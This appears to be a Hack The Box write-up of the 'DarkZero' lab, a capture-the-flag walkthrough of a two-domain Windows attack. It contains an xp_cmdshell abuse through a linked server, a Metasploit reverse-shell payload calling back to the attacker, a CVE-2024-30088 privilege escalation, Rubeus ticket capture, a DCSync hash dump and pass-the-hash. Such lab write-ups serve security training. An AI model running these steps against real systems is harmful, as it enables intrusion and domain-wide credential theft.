---
layout: post
title: "[HTB] DarkZero"
description: "DarkZero is a Hard Windows machine spanning two networked domains. An MSSQL linked server from DC01 to DC02.darkzero.ext allows enabling xp_cmdshell on the remote instance, yielding a shell as svc_sql. Local privilege escalation via CVE-2024-30088 grants SYSTEM on DC02, which has unconstrained delegation configured. Triggering an xp_dirtree callback from DC01 captures a DC01$ TGT via Rubeus, then used with secretsdump to DCSync the darkzero.htb domain and obtain the Administrator hash for a Pass-the-Hash via Evil-WinRM."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Hard
---
![](/img/htb_img/DarkZero_img/img1.png)

- OS: Windows
- Release Date: 04 Oct 2025
- Difficulty: Hard

# Info
Standard credentials:
`john.w` / `RFulUtONCOL!`

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 12:29 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.048s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49891/tcp open  unknown
49908/tcp open  unknown
49962/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
```

Scripts and versions.
```
❯ extractPorts allports
───────┬─────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.129.xx.xx
   5   │     [*] Open ports: 53,88,135,139,389,445,593,636,1433,2179,3268,3269,5985,9389,49664,49667,49670,49671,49891,49908,49962
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────────────────────────────────────────────


❯ nmap -p53,88,135,139,389,445,593,636,1433,2179,3268,3269,5985,9389,49664,49667,49670,49671,49891,49908,49962 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 12:32 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.048s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 17:32:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.xx.xx:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.xx.xx:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-05T17:28:55
|_Not valid after:  2055-10-05T17:28:55
|_ssl-date: 2025-10-05T17:34:03+00:00; +7h00m01s from scanner time.
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49891/tcp open  msrpc         Microsoft Windows RPC
49908/tcp open  msrpc         Microsoft Windows RPC
49962/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2025-10-05T17:33:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.90 seconds
```

### Hosts file
SMB is open so we can use it to generate the hosts file.
```
❯ nxc smb $target -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file hosts
SMB         10.129.xx.xx  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.xx.xx  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 

❯ cat hosts
───────┬─────────────────────────────────────────────────────────────────────────
       │ File: hosts
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ 10.129.xx.xx     DC01.darkzero.htb darkzero.htb DC01
───────┴─────────────────────────────────────────────────────────────────────────

❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## TCP 445: SMB
```
❯ smbmap -H $target -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.xx.xx:445	Name: DC01.darkzero.htb   	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                      NO ACCESS	Remote Admin
	C$                                          NO ACCESS	Default share
	IPC$                                        READ ONLY	Remote IPC
	NETLOGON                                    READ ONLY	Logon server share 
	SYSVOL                                      READ ONLY	Logon server share 
[*] Closed 1 connections
```
Nothing interesting

## DNS
```
❯ dig @DC01.darkzero.htb ANY darkzero.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> @DC01.darkzero.htb ANY darkzero.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40117
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;darkzero.htb.			IN	ANY

;; ANSWER SECTION:
darkzero.htb.		600	IN	A	10.129.xx.xx
darkzero.htb.		600	IN	A	172.16.20.1
darkzero.htb.		3600	IN	NS	dc01.darkzero.htb.
darkzero.htb.		3600	IN	SOA	dc01.darkzero.htb. hostmaster.darkzero.htb. 472 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.darkzero.htb.	1200	IN	A	10.129.xx.xx

;; Query time: 48 msec
;; SERVER: 10.129.xx.xx#53(DC01.darkzero.htb) (TCP)
;; WHEN: Sun Oct 05 12:44:14 CEST 2025
;; MSG SIZE  rcvd: 155
```
We can see an additional A record, `172.16.20.1`.

## TCP 1433: MSSQL
We try to connect to the service:
```
❯ impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.129.xx.xx' -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

Success, but we are not able to enable xp_cmdshell:
```
SQL (darkzero\john.w  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Taking into consideration that we have at least two networks, from the DNS records, we can use the module `enum_links`:
```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

We can see a linked server at DC02.darkzero.ext, with the remote login enabled for `dc01_sql_svc` which is the same as the login we have already used to log into this MSSQL service.
Now that we know there is a linked server, we can establish this link and try the cmdshell again to see if we have perms on the linked one.
```
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
```

As we can see, we now are able to enable the `xp_cmdshell` module.
Now we can execute commands directly, so building a oneliner with revshells or metasploit could give us access to the backend in form of a reverse shell.

## Shell as svc_sql
This time I will be using metasploit with a script called `web_delivery`.
```
msf exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set LHOST tun0
LHOST => 10.10.xx.xx
msf exploit(multi/script/web_delivery) > set LPORT 4444
LPORT => 4444
msf exploit(multi/script/web_delivery) > set target 2
target => 2
msf exploit(multi/script/web_delivery) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.xx.xx:4444 
[*] Using URL: http://10.10.xx.xx:8080/c0R7ibOXjXx
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjA<...snip...>=
```

We execute it on the MSSQL instance with:
```
> xp_cmdshell "<payload>"
```

And we get a hit on the meterpreter handler.
```
msf exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter >
meterpreter > getuid
Server username: darkzero-ext\svc_sql
```

If we execute `ifconfig` we can see that we are at the second network, the DC02 one:
```
meterpreter > getuid
Server username: darkzero-ext\svc_sql
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  5
============
Name         : Microsoft Hyper-V Network Adapter
Hardware MAC : 00:15:5d:f2:5c:01
MTU          : 1500
IPv4 Address : 172.16.20.2
IPv4 Netmask : 255.255.255.0
```

# Foothold
## CVE-2022-21999
Using the exploit suggester module from metasploit I get the following results:
```
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

After massively trying all of them, the only one that ended up working somehow was the number 7: `exploit/windows/local/cve_2024_30088_authz_basep`.

On multiple ocasions I run on the following error:
```
[*] 172.16.20.2 - Meterpreter session 1 closed.  Reason: Died
```
Summary:
```
use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter_reverse_tcp
set session 1
set lhost tun0
set AutoCheck false
exploit
```

To make it work, I migrated the process using the meterpreter session to another cmd.exe, that way it doesn't kill it.
```
[*] Started reverse TCP handler on 10.10.xx.xx:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 1008...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 832
[+] Successfully retrieved winlogon pid: 608
```

### User flag
```
PS C:\Users\Administrator\desktop> type user.txt
<REDACTED>
```

# Privilege Escalation
## Rubeus
If you don't have the Rubeus executable, you can get it like this on kali linux:
```
❯ sudo apt install rubeus

❯ ls /usr/share/windows-resources/rubeus/Rubeus.exe
	/usr/share/windows-resources/rubeus/Rubeus.exe
```

```
meterpreter > cd %temp%
meterpreter > upload Rubeus.exe
[*] Uploading  : /home/kali/HTB/Machines/DarkZero/content/Rubeus.exe -> Rubeus.exe
[*] Uploaded 271.50 KiB of 271.50 KiB (100.0%): /home/kali/HTB/Machines/DarkZero/content/Rubeus.exe -> Rubeus.exe
[*] Completed  : /home/kali/HTB/Machines/DarkZero/content/Rubeus.exe -> Rubeus.exe
meterpreter >
```

The computer has `TrustedForDelegation: True`. -> Unconstrained delegation, having DC01 linked to DC02 we can try to capture the ticket from kerberos with Rubeus.
```
PS C:\Windows\TEMP> Get-ADComputer -Identity $env:COMPUTERNAME -Properties TrustedForDelegation,TrustedToAuthForDelegation

DistinguishedName          : CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext
DNSHostName                : DC02.darkzero.ext
Enabled                    : True
Name                       : DC02
ObjectClass                : computer
ObjectGUID                 : f85520d0-db6e-4a92-9ebc-f01d6d4cc268
SamAccountName             : DC02$
SID                        : S-1-5-21-1969715525-31638512-2552845157-1000
TrustedForDelegation       : True
TrustedToAuthForDelegation : False
UserPrincipalName          : 

PS C:\Windows\TEMP>
```

## Obtaining the ticket
Launching Rubeus with monitor mode, interval of 1 second and nowrap.
```
PS C:\Windows\TEMP> ./Rubeus.exe monitor /interval:1 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs
```

After firing this up, we need to trigger the link, so we get into the MSSQL again and execute `xp_dirtree`:
```
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\testing


[*] 10/6/2025 9:15:50 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/6/2025 2:15:49 PM
  EndTime               :  10/7/2025 12:15:49 AM
  RenewTill             :  10/13/2025 2:15:49 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDb4XNDDQo3RT6cC3VOgCRuhTgmTmMfsxRfcViP14iISyftiaaQjj/B2VqCHsJeBnokaIYddj5jDogdhCCT1MrikUq7ayPBwHlZ83IUAMtiX7blpFIm5S8010rXbsO8D+O30NRqc9FGCr6h758B74CNneKgWFKALcpmhpBM0PV1wFaxcCghVbpw3YMSbjxeHhx3mpKb0DYLBFIB8dYHQE2ur9YZ86WCcpkUvIDUXoOZJXSgOSTTH/vVWZDuLiKhViE+iUq+3xRixnZcPSWur8YYQwuVj3h9BqblNWSEOH2cCcDq53k6csElAOf2k9iJJwrd8D9AkUqg40PHGaXFDd93574c/A4UAzYBsGrCBLTLz/6VpcbeA1umNePeXZZF6wN5oM0GdKvMnWyMCzqoJJ6kXc2ux9vfVDsOWI7ckus7j5jhYUIw52WD0jtMtxELIl02voorPzR+4gjE+/wnLoZnxMij4oJd7hzMj6i3p+kOd5/hHCo66HaO5z0Dvr+naDihZBzOZ1TzSpGYFNG/8tZl72USjqj/cS5st6qEYP4Y9UkmuwDb3iBSULjYu3SGYQ1YP6j9i+d1fAOoTMl3ps6xfrZk1n9Iu64Ketv2FMP6/GqzsiBdzxa9cfDPzVDSxgF1Rh7SvlTRxpUEZcPGSBd5aMJgtDqT+TF1HV8onUkpuDml+QCrmbM8uWs+euGLLVP0GlFbKc5DyaIbg+f/mM9vojxpiHqfXvXs9Z+Cs4BuliDzUe0QHX+wuldq8MmzoDJRKMdUYaL/W/bpQULszQlHfh4CtZyuwgHHxF2labvY9rI4cJrC93f+c66MQdn2O8eFhOcrZke16dkJUrkA3nEOkNSMBWIHe4eIVypXYJc9rU85SIU7BgGNTNvIG4wZnwS6JsuuFtw8IaSVGHZlwbkrVgYIqpVxVLOexyJnTwgQVYaf0QHEK4Gmk6pwXzjln7Bi+oEdVv1kKY5DD3fm+fzSpLwLzVmuj/GcdFcrQx57zaddm7qKbVkdW+IV6afFAy8gY/Tvs3CHetxTZjBIVLdrgcRVIoOXP1pfdxp5R/5RQKIt+XOB06EED0IRochIA1Dt5i5r7RnBr71IjEFJnzu9rOjjZ5spjsHnnbcgHmfgRcwlMPOsrYQGBovZ554cmaQEKYaEnnI+NQV8W2wIKplj4MJFpSpyMW7T51Ke6QnKTg1P9w8sqnCgMaf8j8IarSsHoahSS74olC+ghXlODRsX02XrqIY0cHSUS/U2XfTSRdHznpCGOKDt38oCEaWhSeAJarCHnox0M1yLQePZwWCTnPjD/IIzZ4asX4jByH9H227wRgZ040V+B79kj+XPB6edq/t4hhBQlF+WYzLy1wp37sYe1dS+8de4J/kkrO8NgNdB7zTH8kjLTfdPdz4E+kHRSq1O5fkl3ikST/Zmz8Ocr5Sr+4/yyo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgPrqVdz+qeGp1cbbZJm4SrMxt7O6qUypDDG40qzvQlYihDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDYyMTE1NDlaphEYDzIwMjUxMDA3MDcxNTQ5WqcRGA8yMDI1MTAxMzIxMTU0OVqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
```

So we get the ticket, that is in base64 so we decode it and convert it to a `ccache` ticket.
```
❯ nvim ticket.base64
❯ cat ticket.base64 | base64 -d > ticket.dc01
❯ impacket-ticketConverter ticket.dc01 dc01.ccache
```

We got a valid ticket
```
❯ export KRB5CCNAME=dc01.ccache
❯ klist
Ticket cache: FILE:dc01.ccache
Default principal: DC01$@DARKZERO.HTB

Valid starting       Expires              Service principal
10/06/2025 23:15:49  10/07/2025 09:15:49  krbtgt/DARKZERO.HTB@DARKZERO.HTB
	renew until 10/13/2025 23:15:49
```

## Impacket - Secretsdump
```
❯ impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up...
```

## Shell as administrator
```
❯ evil-winrm -i $target -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root flag
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<REDACTED>
```
